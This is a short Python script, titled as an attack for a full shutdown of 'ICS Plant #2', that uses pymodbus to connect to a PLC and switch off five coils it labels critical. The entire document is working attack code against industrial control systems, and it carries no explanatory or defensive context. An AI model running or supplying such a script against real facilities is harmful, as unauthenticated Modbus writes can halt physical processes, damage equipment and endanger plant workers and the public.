#!/usr/bin/env python3
# Attack: Full Shutdown – ICS Plant #2

from pymodbus.client.sync import ModbusTcpClient

PLC = "192.168.100.10"
CRITICAL_COILS = [0, 1, 2, 3, 4]

client = ModbusTcpClient(PLC)

print(f"[!] Issuing shutdown commands to PLC {PLC}")

if client.connect():
    try:
        for coil in CRITICAL_COILS:
            client.write_coil(coil, False)
            print(f"[!] Coil {coil} set to OFF")
    except Exception as e:
        print("[-] Error:", e)

    client.close()
else:
    print("[-] Unable to connect to PLC")
